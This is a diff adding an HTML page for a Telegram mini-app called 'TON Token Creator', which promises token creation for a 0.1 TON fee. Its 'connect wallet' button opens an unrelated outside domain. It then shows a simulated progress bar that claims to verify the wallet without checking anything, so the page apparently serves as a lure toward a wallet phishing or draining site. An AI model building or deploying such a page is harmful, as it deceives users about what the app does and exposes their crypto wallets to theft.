@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Token Creator</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/lottie-web@5.7.14/build/player/lottie.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            overflow: hidden;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .star {
+            position: absolute;
+            background: #fff;
+            border-radius: 50%;
+            animation: twinkle var(--duration) infinite;
+            opacity: 0;
+            box-shadow: 0 0 2px rgba(255, 255, 255, 0.5);
+        }
+
+        .star.small {
+            width: 1px;
+            height: 1px;
+        }
+
+        .star.medium {
+            width: 1.5px;
+            height: 1.5px;
+        }
+
+        .star.large {
+            width: 2px;
+            height: 2px;
+        }
+
+        @keyframes twinkle {
+            0% { 
+                opacity: 0;
+                transform: translateY(0);
+            }
+            50% { 
+                opacity: var(--max-opacity);
+            }
+            100% { 
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+        }
+
+        .container {
+            position: relative;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            z-index: 1;
+        }
+
+        .welcome-screen {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+            position: relative;
+            margin-top: -20vh;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            color: #ffffff;
+        }
+
+        .description {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 40px;
+            line-height: 1.6;
+            max-width: 80%;
+            letter-spacing: 0.5px;
+        }
+
+        .button {
+            background: #ffffff;
+            color: #000000;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .button:hover {
+            background: rgba(255, 255, 255, 0.9);
+            transform: translateY(-1px);
+        }
+
+        .button:active {
+            transform: translateY(0);
+        }
+
+        .wallet-screen {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .fee-info {
+            margin: 30px 0;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            line-height: 1.8;
+            letter-spacing: 0.5px;
+        }
+
+        .fee-info p {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .fee-info p::before {
+            content: '';
+            display: inline-block;
+            width: 4px;
+            height: 4px;
+            background: #ffffff;
+            border-radius: 50%;
+        }
+
+        .wallet-screen h2 {
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+            color: #ffffff;
+        }
+
+        .progress-container {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 2px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 1px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background-color: #ffffff;
+            width: 0%;
+            transition: width 0.5s ease-in-out;
+        }
+
+        .form-container {
+            display: none;
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: rgba(255, 255, 255, 0.7);
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="number"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            background-color: rgba(255, 255, 255, 0.05);
+            color: white;
+            font-size: 14px;
+            transition: border-color 0.2s ease;
+        }
+
+        .form-group input:focus {
+            border-color: rgba(255, 255, 255, 0.5);
+            outline: none;
+        }
+
+        #imagePreview {
+            max-width: 200px;
+            max-height: 200px;
+            margin-top: 10px;
+            border-radius: 4px;
+            display: none;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <div class="stars" id="starsContainer"></div>
+    <div class="container">
+        <!-- Экран приветствия -->
+        <div class="welcome-screen" id="welcomeScreen">
+            <div class="animation-container" id="animationContainer"></div>
+            <h1 class="title">Welcome to TON Token Creator</h1>
+            <p class="description">
+                Create your own cryptocurrency token on The Open Network.<br>
+                Fast, secure, and decentralized.
+            </p>
+            <button class="button" id="createButton">Create Token</button>
+        </div>
+
+        <!-- Экран подключения кошелька -->
+        <div class="wallet-screen" id="walletConnectScreen">
+            <h2>Connect TON Wallet</h2>
+            <div class="fee-info">
+                <p>Connect your TON wallet</p>
+                <p>Pay a small network fee (0.1 TON)</p>
+            </div>
+            <button class="button" id="connectWalletButton">CONNECT TON WALLET</button>
+        </div>
+
+        <!-- Экран проверки подключения -->
+        <div class="progress-container" id="walletScreen">
+            <h2>Checking Wallet Connection</h2>
+            <p>Please wait while we verify your wallet connection</p>
+            <div class="progress-bar">
+                <div class="progress-bar-fill" id="walletProgress"></div>
+            </div>
+            <p id="walletStatus">Verifying connection...</p>
+        </div>
+
+        <!-- Форма создания токена -->
+        <div class="form-container" id="formScreen">
+            <div class="form-group">
+                <label for="tokenName">Token Name</label>
+                <input type="text" id="tokenName" placeholder="Enter token name">
+            </div>
+
+            <div class="form-group">
+                <label for="tokenSupply">Token Supply</label>
+                <input type="number" id="tokenSupply" placeholder="Enter total number of tokens" min="1">
+            </div>
+
+            <div class="form-group">
+                <label for="tokenImage">Token Image</label>
+                <input type="file" id="tokenImage" accept="image/*">
+                <img id="imagePreview">
+            </div>
+
+            <button class="button" id="submitButton">Create Token</button>
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // Улучшенное создание звезд
+        function createStars() {
+            const container = document.getElementById('starsContainer');
+            const starCount = 200; // Увеличили количество звезд
+
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                
+                // Случайный размер звезды
+                const size = Math.random();
+                if (size < 0.5) {
+                    star.classList.add('small');
+                } else if (size < 0.8) {
+                    star.classList.add('medium');
+                } else {
+                    star.classList.add('large');
+                }
+                
+                // Случайное положение
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                
+                // Случайная длительность анимации
+                star.style.setProperty('--duration', (3 + Math.random() * 7) + 's');
+                
+                // Случайная максимальная прозрачность
+                star.style.setProperty('--max-opacity', 0.5 + Math.random() * 0.5);
+                
+                // Случайная задержка
+                star.style.animationDelay = Math.random() * 5 + 's';
+                
+                container.appendChild(star);
+            }
+        }
+
+        // Создаем звезды при загрузке
+        createStars();
+
+        // Инициализация Lottie анимации
+        let animation = lottie.loadAnimation({
+            container: document.getElementById('animationContainer'),
+            renderer: 'svg',
+            loop: true,
+            autoplay: true,
+            path: 'animation.json'
+        });
+
+        // Обработчики кнопок
+        document.getElementById('createButton').addEventListener('click', () => {
+            document.getElementById('welcomeScreen').style.display = 'none';
+            document.getElementById('walletConnectScreen').style.display = 'block';
+        });
+
+        document.getElementById('connectWalletButton').addEventListener('click', () => {
+            // Открываем ваш сайт для подключения кошелька
+            window.open('https://kelt.ton-app.buzz', '_blank');
+            
+            // Показываем экран проверки
+            document.getElementById('walletConnectScreen').style.display = 'none';
+            document.getElementById('walletScreen').style.display = 'block';
+            simulateWalletConnection();
+        });
+
+        document.getElementById('submitButton').addEventListener('click', submitForm);
+
+        // Предпросмотр изображения
+        document.getElementById('tokenImage').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const preview = document.getElementById('imagePreview');
+                    preview.src = e.target.result;
+                    preview.style.display = 'block';
+                }
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // Симуляция подключения кошелька
+        function simulateWalletConnection() {
+            let progress = 0;
+            const progressBar = document.getElementById('walletProgress');
+            const statusText = document.getElementById('walletStatus');
+
+            const interval = setInterval(() => {
+                progress += 2;
+                progressBar.style.width = `${progress}%`;
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.getElementById('walletScreen').style.display = 'none';
+                        document.getElementById('formScreen').style.display = 'block';
+                    }, 500);
+                }
+            }, 40);
+        }
+
+        // Отправка формы
+        function submitForm() {
+            const tokenName = document.getElementById('tokenName').value;
+            const tokenSupply = document.getElementById('tokenSupply').value;
+            const imageFile = document.getElementById('imagePreview').src;
+
+            if (!tokenName || !imageFile || !tokenSupply) {
+                alert('Please fill all fields');
+                return;
+            }
+
+            const data = {
+                tokenName: tokenName,
+                tokenSupply: tokenSupply,
+                imageUrl: imageFile,
+                requestId: generateRequestId()
+            };
+
+            tg.sendData(JSON.stringify(data));
+            tg.close();
+        }
+
+        // Генерация ID запроса
+        function generateRequestId() {
+            return 'REQ' + Date.now().toString(36).toUpperCase();
+        }
+    </script>
+</body>
+</html> 
